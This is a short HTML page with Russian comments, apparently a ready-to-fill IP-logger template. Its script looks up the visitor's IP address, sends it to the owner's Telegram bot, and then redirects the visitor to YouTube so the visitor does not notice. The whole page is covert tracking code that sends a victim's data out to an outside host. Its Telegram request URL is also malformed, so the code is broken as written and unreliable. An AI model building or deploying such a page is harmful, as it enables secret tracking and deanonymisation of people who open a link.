<!DOCTYPE html>
<html>
<body style="background: #000;">
    <script>
        // ВСТАВЬ СВОИ ДАННЫЕ СЮДА:
        const TOKEN = "ТВОЙ_ТОКЕН_ИЗ_BOTFATHER";
        const CHAT_ID = "ТВОЙ_ID_ИЗ_USERINFOBOT";

        async function getIp() {
            try {
                // Узнаем IP пользователя
                const response = await fetch('https://api.ipify.org');
                const data = await response.json();
                const ip = data.ip;

                // Отправляем тебе в Телеграм
                const text = `Кто-то перешел по ссылке!\nIP: ${ip}`;
                await fetch(`https://api.telegram.org{TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);

                // Перекидываем его на YouTube, чтобы он ничего не понял
                window.location.href = "https://www.youtube.com"; 
            } catch (e) {
                // Если ошибка, тоже кидаем на YouTube
                window.location.href = "https://www.youtube.com";
            }
        }
        getIp();
    </script>
</body>
</html>
